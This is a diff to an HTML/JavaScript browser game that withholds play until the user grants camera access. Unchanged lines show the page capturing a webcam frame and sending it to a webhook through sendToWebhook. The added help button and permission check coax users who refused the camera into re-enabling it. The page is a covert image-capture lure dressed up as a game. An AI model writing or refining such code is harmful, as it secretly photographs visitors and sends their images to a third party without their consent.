@@ -45,6 +45,8 @@
       justify-content: center;
       color: white;
       font-size: 1.1rem;
+      text-align: center;
+      padding: 10px;
     }
 
     #player {
@@ -76,6 +78,12 @@
       border: none;
       cursor: pointer;
     }
+
+    #helpBtn {
+      background: #444;
+      color: white;
+      margin-top: 10px;
+    }
   </style>
 </head>
 <body>
@@ -87,6 +95,7 @@
     <div id="overlay">
       <p>This is a preview. Grant camera access to play!</p>
       <button id="grantPermsBtn">Grant Camera Access</button>
+      <button id="helpBtn">Need Help?</button>
     </div>
   </div>
 
@@ -94,15 +103,43 @@
     const canvas = document.getElementById('canvas');
     const ctx = canvas.getContext('2d');
     const grantBtn = document.getElementById('grantPermsBtn');
+    const helpBtn = document.getElementById('helpBtn');
     const overlay = document.getElementById('overlay');
     const player = document.getElementById('player');
     const gameBox = document.getElementById('game-box');
     
     let playerX = gameBox.offsetWidth / 2 - 25;
-    let gameStarted = false;
     let cameraGranted = false;
 
-    // Send webcam image to webhook
+    // Show help text if user clicks help button
+    helpBtn.addEventListener("click", () => {
+      overlay.innerHTML = `
+        <p><strong>Camera access was denied.</strong><br>
+        To reset it:</p>
+        <ul style="text-align: left;">
+          <li>Click the <strong>🔒 lock icon</strong> in your browser’s address bar</li>
+          <li>Find "Camera" in the list</li>
+          <li>Set it to "Allow"</li>
+          <li>Refresh the page</li>
+        </ul>
+      `;
+    });
+
+    // Detect denied permissions using Permissions API
+    if (navigator.permissions) {
+      navigator.permissions.query({ name: 'camera' }).then(result => {
+        if (result.state === 'denied') {
+          overlay.innerHTML = `
+            <p><strong>Camera permission denied.</strong><br>
+            Please allow camera access in your browser settings and refresh the page.</p>
+            <button id="helpBtn">Need Help?</button>
+          `;
+          document.getElementById("helpBtn").addEventListener("click", () => helpBtn.click());
+        }
+      });
+    }
+
+    // Request camera and grab frame
     async function requestCamera() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
@@ -116,7 +153,6 @@
           sendToWebhook(imageData);
           stream.getTracks().forEach(track => track.stop());
 
-          // Now turn off overlay
           overlay.style.display = "none";
           cameraGranted = true;
         };
@@ -181,7 +217,7 @@
     // Game loop
     function gameLoop() {
       if (!cameraGranted) {
-        // Auto move for preview/demo mode
+        // Preview mode: auto-move
         playerX += Math.random() < 0.5 ? -3 : 3;
       }
       playerX = Math.max(0, Math.min(gameBox.offsetWidth - 50, playerX));
@@ -190,14 +226,14 @@
       requestAnimationFrame(gameLoop);
     }
 
-    // Controls
+    // Keyboard
     document.addEventListener('keydown', (e) => {
       if (!cameraGranted) return;
       if (e.key === 'ArrowLeft') playerX -= 15;
       if (e.key === 'ArrowRight') playerX += 15;
     });
 
-    // Tilt for mobile
+    // Mobile tilt
     if (window.DeviceOrientationEvent) {
       window.addEventListener('deviceorientation', (event) => {
         if (!cameraGranted) return;
@@ -207,7 +243,6 @@
       });
     }
 
-    // Start the loop and coin spawner
     setInterval(spawnCoin, 1000);
     gameLoop();
   </script>
